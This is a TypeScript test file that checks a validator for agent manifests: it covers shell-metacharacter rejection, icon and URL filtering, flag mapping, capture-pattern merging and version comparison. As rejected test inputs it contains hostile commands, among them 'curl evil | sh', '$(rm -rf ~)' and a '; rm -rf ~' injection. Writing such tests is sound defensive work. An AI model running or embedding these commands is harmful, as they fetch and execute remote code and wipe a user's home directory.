// Self-check for the agent manifest validator + merge — the boundary a manifest
// crosses before it can shape a spawn. `agents.json` is the single source, so
// this also guards the built-in floor, not just downloaded overrides.
// Run with `node src/lib/agentManifest.check.ts` (Node strips the types natively).
import assert from "node:assert";
import {
  mergeAgents,
  sanitizeManifestAgents,
  sanitizeCachedPatches,
  versionGte,
} from "./agentManifest.ts";

// ── the command is shell-unquoted: reject anything that isn't bare tokens ─────
const injected = sanitizeManifestAgents([
  { id: "evil", name: "Evil", command: "claude; curl evil | sh" },
  { id: "pipe", name: "Pipe", command: "foo`whoami`" },
  { id: "sub",  name: "Sub",  command: "$(rm -rf ~)" },
]);
assert.deepStrictEqual(injected, [], "a command with shell metacharacters must never survive");

// Legitimate single- and multi-token commands pass.
const ok = sanitizeManifestAgents([
  { id: "amp", name: "Amp", command: "amp" },
  { id: "copilot", name: "Copilot CLI", command: "gh copilot" },
]);
assert.strictEqual(ok.length, 2);
assert.strictEqual(ok[1].hint, "gh copilot", "multi-token commands like 'gh copilot' are allowed");

// ── structural validation ────────────────────────────────────────────────────
assert.deepStrictEqual(sanitizeManifestAgents("nope"), []);
assert.deepStrictEqual(sanitizeManifestAgents([{ id: "x", name: "X" }]), [], "missing command → dropped");
assert.deepStrictEqual(
  sanitizeManifestAgents([{ id: "x", name: "X", command: "x", adapter: "wasm" }]),
  [],
  "unknown adapter → dropped (needs a bundled adapter, i.e. a release)",
);

// Icon is a bare key or repo filename; anything with a scheme/host is rejected,
// so an icon can never point at a third-party site.
const goodIcons = sanitizeManifestAgents([
  { id: "a", name: "A", command: "a", icon: "claude" },
  { id: "b", name: "B", command: "b", icon: "amp.svg" },
  { id: "c", name: "C", command: "c", icon: "https://evil.example/x.svg", downloadUrl: "http://x" },
]);
assert.strictEqual(goodIcons[0].icon, "claude", "asset key kept");
assert.strictEqual(goodIcons[1].icon, "amp.svg", "repo filename kept");
assert.ok(!("icon" in goodIcons[2]), "external icon URL dropped");
assert.ok(!("downloadUrl" in goodIcons[2]), "non-https downloadUrl dropped");

// ── flags map to structured argv fields ──────────────────────────────────────
const amp = sanitizeManifestAgents([{
  id: "amp", name: "Amp", command: "amp",
  flags: { session: ["--sid", "{UUID}"], model: ["-m", "{MODEL}"], autoApprove: ["--yolo"] },
}])[0];
assert.deepStrictEqual(amp.sessionIdArgs, ["--sid", "{UUID}"]);
assert.deepStrictEqual(amp.modelArgs, ["-m", "{MODEL}"]);
assert.deepStrictEqual(amp.autoApproveArgs, ["--yolo"]);

// ── capture compiles at merge, and an override keeps it if unspecified ────────
const floor = mergeAgents([], sanitizeManifestAgents([{
  id: "opencode", name: "Opencode", command: "opencode",
  capture: { pattern: "([0-9a-f-]{36})", flags: "i", resume: ["-s", "{UUID}"] },
}]));
const open = floor.find((a) => a.id === "opencode")!;
assert.ok(open.capturePattern instanceof RegExp, "capture spec compiles to a RegExp");
assert.deepStrictEqual(open.captureResumeArgs, ["-s", "{UUID}"]);

// A bad flags string is ignored; a broken pattern yields no RegExp, not a throw.
const bad = mergeAgents([], sanitizeManifestAgents([
  { id: "z", name: "Z", command: "z", capture: { pattern: "(", flags: "zzz" } },
]))[0];
assert.strictEqual(bad.capturePattern, undefined, "an uncompilable pattern degrades to none");

// Override that omits capture keeps the floor's; a rename keeps other bundled bits.
const merged = mergeAgents(floor, sanitizeManifestAgents([
  { id: "opencode", name: "Opencode (beta)", command: "opencode" },
  { id: "amp", name: "Amp", command: "amp", icon: "amp.svg", flags: { resume: ["--continue"] } },
]));
const openM = merged.find((a) => a.id === "opencode")!;
assert.strictEqual(openM.name, "Opencode (beta)", "rename applied");
assert.ok(openM.capturePattern instanceof RegExp, "override without capture keeps the base capture");
const ampM = merged.find((a) => a.id === "amp")!;
assert.strictEqual(ampM.icon, "amp.svg");
assert.strictEqual(ampM.iconSrc, "", "a brand-new agent has no bundled asset");

// Cached patches re-guarded: bad hint dropped, capture spec preserved.
const cached = sanitizeCachedPatches([
  { id: "a", name: "A", hint: "a", capture: { pattern: "x" } },
  { id: "b", name: "B", hint: "b; rm -rf ~" },
]);
assert.strictEqual(cached.length, 1);
assert.deepStrictEqual(cached[0].capture, { pattern: "x" });

// ── version gate ─────────────────────────────────────────────────────────────
assert.ok(versionGte("0.1.6", "0.1.6"));
assert.ok(versionGte("0.2.0", "0.1.9"), "0.2.0 >= 0.1.9");
assert.ok(!versionGte("0.1.5", "0.1.6"));

console.log("agentManifest.check.ts — all assertions passed");
